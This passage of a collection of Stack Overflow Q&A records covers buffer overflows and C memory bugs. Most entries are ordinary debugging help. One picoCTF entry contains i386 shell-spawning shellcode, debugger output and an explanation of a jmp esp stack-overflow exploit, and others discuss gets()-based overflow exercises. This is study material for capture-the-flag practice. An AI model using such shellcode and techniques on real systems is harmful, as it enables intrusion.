        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
